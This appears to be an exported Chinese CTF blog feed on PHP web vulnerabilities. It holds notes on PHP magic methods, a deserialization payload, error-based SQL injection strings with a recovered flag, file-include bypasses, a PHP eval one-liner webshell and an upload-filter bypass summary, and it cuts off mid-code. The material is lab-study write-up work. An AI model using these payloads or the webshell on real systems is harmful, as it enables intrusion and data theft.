    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、__get、__set</span><br><span class="line"></span><br><span class="line">这两个方法是为在类和他们的父类中没有声明的属性而设计的</span><br><span class="line"></span><br><span class="line">__get( $property ) 当调用一个未定义的属性时访问此方法</span><br><span class="line"></span><br><span class="line">__set( $property, $value ) 给一个未定义的属性赋值时调用</span><br><span class="line"></span><br><span class="line">这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span><br><span class="line"></span><br><span class="line">2、__isset、__unset</span><br><span class="line"></span><br><span class="line">__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</span><br><span class="line"></span><br><span class="line">__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法</span><br><span class="line"></span><br><span class="line">与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</span><br><span class="line"></span><br><span class="line">3、__call</span><br><span class="line"></span><br><span class="line">__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</span><br><span class="line"></span><br><span class="line">4、__autoload</span><br><span class="line"></span><br><span class="line">__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</span><br><span class="line"></span><br><span class="line">注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。</span><br><span class="line"></span><br><span class="line">5、__construct、__destruct</span><br><span class="line"></span><br><span class="line">__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line"></span><br><span class="line">__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line"></span><br><span class="line">默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.</span><br><span class="line"></span><br><span class="line">在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</span><br><span class="line"></span><br><span class="line">6、__clone</span><br><span class="line"></span><br><span class="line">PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</span><br><span class="line"></span><br><span class="line">7、__toString</span><br><span class="line"></span><br><span class="line">__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。</span><br><span class="line"></span><br><span class="line">在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）</span><br><span class="line"></span><br><span class="line">从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</span><br><span class="line"></span><br><span class="line">8、__sleep、__wakeup</span><br><span class="line"></span><br><span class="line">__sleep 串行化的时候用</span><br><span class="line"></span><br><span class="line">__wakeup 反串行化的时候调用</span><br><span class="line"></span><br><span class="line">serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</span><br><span class="line"></span><br><span class="line">使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</span><br><span class="line"></span><br><span class="line">相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</span><br><span class="line"></span><br><span class="line">9、__set_state</span><br><span class="line"></span><br><span class="line">当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。</span><br><span class="line"></span><br><span class="line">10、__invoke</span><br><span class="line"></span><br><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效</span><br><span class="line"></span><br><span class="line">11、__callStatic</span><br><span class="line"></span><br><span class="line">它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。</span><br><span class="line"></span><br><span class="line">同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</span><br></pre></td></tr></table></figure>

<span id="more"></span>]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(引用赋值构造序列化)BUU CODE REVIEW</title>
    <url>/2023/01/07/%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96-BUU-CODE-REVIEW/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96-BUU-CODE-REVIEW/1671156619595-b76e2b48-9ad5-4925-82b8-bca093b24e0f.png" alt="img"></p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> \* Created by PhpStorm.</span><br><span class="line"> \* User: jinzhao</span><br><span class="line"> \* Date: 2019/10/6</span><br><span class="line"> \* Time: 8:04 PM</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);			//高亮显示当前页面源码</span><br><span class="line"></span><br><span class="line">class BUU &#123;							//类：BUU</span><br><span class="line">   public $correct = &quot;&quot;;			//公有属性：$correct</span><br><span class="line">   public $input = &quot;&quot;;				//公有属性：$input</span><br><span class="line">	</span><br><span class="line">   public function __destruct() &#123;	//公有析构方法__destruct()，在当前类的实例化对象销毁前，自动被调用</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());	//给correct赋值为base64_encode(uniqid())</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;		//判断两个属性是否全等</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);			//若全等，则打印根目录下的flag</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_GET[&#x27;pleaseget&#x27;] === &#x27;1&#x27;) &#123;		//判断pleaseget===&#x27;1&#x27;&amp;&amp;pleasepost===&#x27;2&#x27;&amp;&amp;md1!=md52&amp;&amp;md5(md51)==md5(md52)</span><br><span class="line">    if($_POST[&#x27;pleasepost&#x27;] === &#x27;2&#x27;) &#123;</span><br><span class="line">        if(md5($_POST[&#x27;md51&#x27;]) == md5($_POST[&#x27;md52&#x27;]) &amp;&amp; $_POST[&#x27;md51&#x27;] != $_POST[&#x27;md52&#x27;]) &#123;</span><br><span class="line">            unserialize($_POST[&#x27;obj&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路</p>
<p>GET提交：?pleaseget=1</p>
<p>POST提交的第一部分：pleasepost=2&amp;md51[]=1&amp;md52[]=2</p>
<p>POST提交的第二部分：一个BUU类的实例化对象，且两个属性值在经过$this-&gt;correct = base64_encode(uniqid());这个之后，依然全等，那么这里我们可以把变化的$correct属性的引用赋值给属性$input</p>
<p>//uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。</p>
<p>//传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。</p>
<p>//引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。</p>
<p>构造序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class BUU &#123;</span><br><span class="line">   public $correct = &quot;&quot;;</span><br><span class="line">   public $input = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$aa = new BUU();</span><br><span class="line">$aa-&gt;input=&amp;$aa-&gt;correct;</span><br><span class="line">$aaa = serialize($aa);</span><br><span class="line">print_r($aaa);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/07/%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96-BUU-CODE-REVIEW/1671156711537-ad3cae2f-634a-4439-a8bc-c48cdaf800e1.png" alt="img"></p>
<p>$aa-&gt;input=&amp;$aa-&gt;correct;</p>
<p>这一行代码是引用赋值</p>
<p><img src="/2023/01/07/%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96-BUU-CODE-REVIEW/1671156847581-625d49be-fa1e-42f2-bcea-520d2e1da2c1.png" alt="img"></p>
<p>payload</p>
<p>GET部分：?pleaseget=1</p>
<p>POST部分：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:”BUU”:2:{s:7:”correct”;s:0:””;s:5:”input”;R:2;}</p>
<p><img src="/2023/01/07/%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC%E6%9E%84%E9%80%A0%E5%BA%8F%E5%88%97%E5%8C%96-BUU-CODE-REVIEW/1671156772602-f8427614-90bf-44ea-b138-c6c4fecafc6b.png" alt="img"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(报错注入)[SWPUCTF 2021 新生赛]error(复现)</title>
    <url>/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670981836315-077cff39-364a-4d39-b030-9702a7ca1cb6.png" alt="img"></p>
<span id="more"></span>

<p>正常输入判断注入点</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670981874043-19a18628-ddeb-4557-bdc7-5a089d68cc99.png" alt="img"></p>
<p>输入1正常</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670981901678-19b44580-8099-4599-a44f-f48a4ac5ab96.png" alt="img"></p>
<p>输入1’ 报错</p>
<p>观察报错点，<img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670981930601-ee1477dd-0f76-4e79-842a-17da16d463a6.png" alt="img"></p>
<p>1的右边多了一个’</p>
<p>可能是字符型注入</p>
<p>接着判断</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670981998436-0484397c-a6f8-4eb9-b4dc-93225ec40863.png" alt="img"></p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982014319-e9219f3f-8a25-456f-bff9-8c8f17b96aed.png" alt="img"></p>
<p>如上可知是字符型注入，属于单引号闭合</p>
<p>接着正常注入流程</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982102319-6a77af40-23a9-4df7-ab24-356d36e13bbc.png" alt="img"></p>
<p>判断得知有三个字段</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982142333-497a784e-b102-477a-b3b5-cfda462082f8.png" alt="img"></p>
<p>可惜没有报错回显</p>
<p>判断属于无回显字符型报错注入</p>
<p>使用报错函数注入方式  </p>
<p>-1’ union select extractvalue(1,concat(0x7e,(select database())))#</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982349544-28298c74-7d94-4244-b806-640e46c3d9e5.png" alt="img"></p>
<p>-1’ union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’test_db’)))#<br> <img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982388550-e22ca230-26a5-40bf-bee9-5ab4af8fe48c.png" alt="img"></p>
<p>-1’ union select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’test_tb’)))#</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982446855-81e128ab-556c-471c-a41f-56a0bfcbc58b.png" alt="img"></p>
<p>-1’ union select extractvalue(1,concat(0x7e,(select group_concat(flag) from test_tb)))#</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982528304-8ddc6a6b-2fc4-4589-af5d-765de8721df4.png" alt="img"></p>
<p>此处涉及到 extractvalue函数 </p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982606359-4ccfd0fa-66db-443c-9a05-730e1303cb3c.png" alt="img"></p>
<p>只能输出32位，所以使用mysql中的right函数</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982641872-a2fa8f11-164b-4699-ae7e-df955984845a.png" alt="img"></p>
<p>-1’ union select extractvalue(1,concat(0x7e,(select group_concat(right(flag,30)) from test_tb)))#</p>
<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670982669851-8252474d-9ef9-45d1-a329-89ace55a7923.png" alt="img"></p>
<p>两段flag拼接   NSSCTF{e5b2ff25-eb68-474e-90c6-11bc6591661e}’</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）</title>
    <url>/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910232518-495a690a-4783-427c-a775-eda71d6f1c4e.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910568528-ca80407a-37d5-46c5-9a65-d353be949613.png" alt="img"></p>
<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910692582-83b88d68-0c51-4de8-ac64-86e6b897102b.png" alt="img"></p>
<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672917386671-e8576ed5-a7c2-4445-b76c-152bf817402b.png" alt="img"></p>
<h2 id="熊海cms文件包含漏洞-指定前缀files"><a href="#熊海cms文件包含漏洞-指定前缀files" class="headerlink" title="熊海cms文件包含漏洞(指定前缀files/)"></a>熊海cms文件包含漏洞(指定前缀files/)</h2><?php

//单一入口模式

error_reporting(0); //关闭错误显示

$file=addslashes($_GET['r']); //接收文件名

$action=$file==''?'index':$file; //判断为空或者等于index

include('files/'.$action.'.php'); //载入相应文件

?>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>两个index.php文件均为以下内容，代码中对GET传参只进行了一个 addslashes过滤操作，但该操作对预防文件包含没有什么作用，我们只需要在对应的files文件下存在以 .php结尾的文件，即可利用文件名(不包含.php后缀)作为参数 r的内容，达到文件包含的目的</p>
<p>由于用了 addslashes函数所以不能用%00截断来绕过.php后缀</p>
<p>可以用………（256个.）</p>
<p>或者././././(256个./)绕过</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(文件上传+命令执行)BUU UPLOAD COURSE</title>
    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158113792-baa4586e-7558-4d92-b3dc-e9554a91fe2f.png" alt="img"></p>
<span id="more"></span>

<p>这一题没有过滤，但是上传的文件都会被改成jpg</p>
<p>所以.htaccess在这里也用不了</p>
<p>我们发现，虽然文件重命名了，但是还是可以执行php代码，于是上传一句话<a href="https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">木马</a>，然后蚁剑链接即可</p>
<p>是我们还可以用命令执行</p>
<p>先传一个一句话木马</p>
<?php @eval($_POST['shell']);?>

<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158233871-6ebad957-2b4f-4901-b706-325d63cfa0af.png" alt="img"></p>
<p>在url中的file后面添加文件路径</p>
<p>最后getshell</p>
<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-BUU-UPLOAD-COURSE/1671158261614-c05eccbe-642a-4830-ad87-5c48c0073152.png" alt="img"></p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传绕过总结</title>
    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Pass-10（黑名单）</p>
<p>这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行</p>
<p>f i l e n a m e = d e l d o t ( file_name = deldot(file </p>
<p>name=deldot(file_name)操作去除文件名末尾的点，构造后缀绕过黑名单</p>
<p>补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</p>
<p>上传zoe.php 然后用bp改后缀加点空格点（即文件名为zoe.php. .）</p>
<span id="more"></span>



<h2 id="Pass01"><a href="#Pass01" class="headerlink" title="Pass01"></a>Pass01</h2><p>JS前端校验:</p>
<h2 id="Pass02"><a href="#Pass02" class="headerlink" title="Pass02"></a>Pass02</h2><p>MIME校验：</p>
<h2 id="Pass03"><a href="#Pass03" class="headerlink" title="Pass03"></a>Pass03</h2><p>黑名单校验不严：</p>
<p>黑名单检测，检测了.php后缀，但未检测php3，phtml等后缀。</p>
<h2 id="Pass04"><a href="#Pass04" class="headerlink" title="Pass04"></a>Pass04</h2><p>黑名单校验不严：</p>
<p>中间件为Apache的情况下，黑名单未校验htaccess文件，导致可上传htaccess文件，绕过黑名单检测。</p>
<p>以下配置 将后缀为lalala的文件，当成php解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;lalala&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Pass05"><a href="#Pass05" class="headerlink" title="Pass05"></a>Pass05</h2><p>黑名单校验不严：</p>
<p>当PHP以CGI／FastCGI模式运行的情况下，黑名单未校验后缀为.ini的文件，导致可上传.user.ini文件，绕过黑名单检测。</p>
<p>详情可以看下乌云的一篇文章</p>
<p><a href="https://www.php.net/manual/zh/configuration.file.per-user.php">.user.ini 文件官方说明</a></p>
<p>使用作者提供的phpstudy集成环境是无法利用.user.ini文件，因为不满足利用的三个条件：</p>
<ol>
<li>服务器脚本语言为PHP</li>
<li>服务器使用CGI／FastCGI模式</li>
<li>上传目录下要有可执行的php文件</li>
</ol>
<p>其中 第二条不满足,使用的模式不是CGI／FastCGI。<br>第三个条件，作者在upload目录下为我们提供了一个readme.php。</p>
<h2 id="Pass06"><a href="#Pass06" class="headerlink" title="Pass06"></a>Pass06</h2><p>黑名单校验不严，没有将获取到的后缀名 转换 为小写字母 后再进行判断。<br>黑名单校验不严，后缀大小写绕过。</p>
<h2 id="Pass07"><a href="#Pass07" class="headerlink" title="Pass07"></a>Pass07</h2><p>黑名单校验不严，导致可结合Windows系统特性 空格 绕过。</p>
<p>黑名单校验不严，后缀加空格绕过.</p>
<p>利用windows 特性(windows文件名后缀不允许存在空格，如果存在，windows自动去除空格)空格绕过。</p>
<p>上传文件名1.php空格 -&gt;php空格不在黑名单内，正常上传-&gt;windows发现写入的文件名有空格，自动去除空格-&gt;最后在磁盘上的文件名 就变成了1.php</p>
<h2 id="Pass08"><a href="#Pass08" class="headerlink" title="Pass08"></a>Pass08</h2><p>黑名单校验不严，导致可结合Windows系统特性点.绕过。<br> 黑名单校验不严，后缀加.绕过.</p>
<p>利用windows特性(windows文件名后缀不允许存在.，如果存在，windows自动去除).绕过。</p>
<h2 id="Pass09"><a href="#Pass09" class="headerlink" title="Pass09"></a>Pass09</h2><p>黑名单校验不严，导致可结合Windows系统特性::$DATA绕过。<br>利用windows特性::$DATA绕过。<br>DATA是NTFS文件系统的存储数据流的默认属性。</p>
<p>当访问1.php::$DATA时，就是请求1.php本身的数据。</p>
<h2 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h2><p>黑名单校验不严，导致可结合Windows系统特性.绕过</p>
<p>黑名单校验不严，导致php.php. .绕过。</p>
<p>php.php.空格. -&gt; 删除文件名末尾的点,变为php.php.空格-&gt; 首尾去空，变为php.php.-&gt;php.后缀不在黑名单内，绕过黑名单验证-&gt;Windows发现文件名最后有.，自动去除 -&gt; 最终磁盘上的文件名为php.php</p>
<h2 id="Pass11"><a href="#Pass11" class="headerlink" title="Pass11"></a>Pass11</h2><p>黑名单过滤，只过滤一次，因此双写pphphp绕过。</p>
<h2 id="Pass12"><a href="#Pass12" class="headerlink" title="Pass12"></a>Pass12</h2><p>save_path 保存路径参数可控，Get参数，直接%00 截断，中间件Apache接收到请求后会将%00解码一次，也就变成了空字节,在内存中 一段字符串的结束通常以空字节标识，空字节后面的数据也就被截断了，因此$img_path=../upload/lxhsec.php</p>
<h2 id="Pass13"><a href="#Pass13" class="headerlink" title="Pass13"></a>Pass13</h2><p>save_path 保存路径参数可控，因为是POST参数，在取save_path值的时候，中间件Apache并不会自动解码一次，因此需要自己手动将%00解码一次。</p>
<h2 id="Pass14"><a href="#Pass14" class="headerlink" title="Pass14"></a>Pass14</h2><p>判断文件内容前两个字节是否是图片前缀。</p>
<p>因此解法1，添加图片前缀，例如gif 前缀 GIF89a</p>
<p>然后利用文件包含 getshell。<br>include.php?file=upload/3620200111182701.gif</p>
<p>解法2，制作图片木马。<br>copy test.png/b+1.php/a 3.png</p>
<p>test.png：随便一个png格式图片<br>1.php: 你的php代码<br>3.png: 合并之后的图片</p>
<p>3.png用文本编辑器打开，可以看到1.php的内容：</p>
<h5 id="Pass-14-16-图片马"><a href="#Pass-14-16-图片马" class="headerlink" title="Pass-14~16-图片马"></a>Pass-14~16-图片马</h5><h2 id="Pass-17（二次渲染绕过）"><a href="#Pass-17（二次渲染绕过）" class="headerlink" title="Pass-17（二次渲染绕过）"></a>Pass-17（二次渲染绕过）</h2><p>这一关对上传图片进行了判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接</p>
<h2 id="Pass18条件竞争"><a href="#Pass18条件竞争" class="headerlink" title="Pass18条件竞争"></a>Pass18条件竞争</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span 